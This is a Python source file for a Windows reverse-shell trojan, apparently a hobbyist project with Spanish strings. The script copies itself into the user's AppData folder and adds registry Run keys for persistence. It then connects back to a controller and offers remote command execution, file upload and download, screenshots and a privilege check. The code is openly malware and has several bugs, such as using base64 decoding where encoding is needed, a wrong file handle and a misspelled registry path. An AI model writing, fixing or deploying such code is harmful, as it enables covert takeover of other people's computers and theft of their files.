#!/usr/bin/env python

import socket
import os
import subprocess
import base64
import time
import shutil
import sys
from unittest import result
import mss

def admin_check():
    global admin
    try:
        check=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
    except:
        admin="ERROR, privilegios insuficientes"

    else:
        admin="Privilegios de administrador"

def crear_peersistence():
    location=os.environ["appdata"]+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\SOFWARE\Microsoft\Windows\CurrentVersion\Run /v netcalc /t REG_SZ /d "'+ location +'"',shell=True)
        subprocess.call('reg add HKCU\SOFWARE\Microsoft\Windows\CurrentVersion\Run /v netcalcl /t REG_SZ /d "'+ location +'"',shell=True)
def connection():
    while True:
        time.sleep(5)
        try:
            cliente.connect(("localhost",8080))
            shell()
        except:
            connection()

def captura_pantalla():
    screen=mss.mss()
    screen.shot()

def shell():
    current_dir=os.getcwd()
    cliente.send(str.encode(current_dir))
    while True:
        res=cliente.recv(1024)
        if res=="exit":
            break        
        elif(res[:2]=="cd"):
            os.chdir(res[3:])
            result=os.getcwd()
            cliente.send(str.encode(result))        
        elif(res[:8]=="download"):            
            with open(res[9:],"rb")as file_download:
                cliente.send(base64.b64decode(file_download.read()))                
        elif(res[:6]=="upload"):                          
                with open(res[7:],"wb")as file_upload:
                    datos=cliente.recv(300000)
                    file_download.write(base64.b64decode(datos))          
        elif(res[:10]=="screenshot"):
            try:
                captura_pantalla()
                with open("monitor-1.png","rb")as file_send:
                    cliente.send(base64.b64decode(file_send.read()))
                os.remove("monitor-1.png")
            except:
                cliente.send(base64.b64decode('fail'))
        elif(res[:5])=="start":
            try:
                subprocess.Popen(res[:6],shell=True)
                cliente.send("programa ejecutado")
            except:
                cliente.send("no se pudo iniciar el proceso")

        elif(res[:5])=="check":
            try:
                admin_check()
                cliente.send(admin)
            except:
                cliente.send("No se pudo realizar la tarea")
        else:
            proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=proc.stdout.read()+proc.stderr.read
            if len(result)==0:
                cliente.send(str.encode("1"))
            else:
                cliente.send(result)
crear_peersistence()
cliente=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
cliente.close()
                   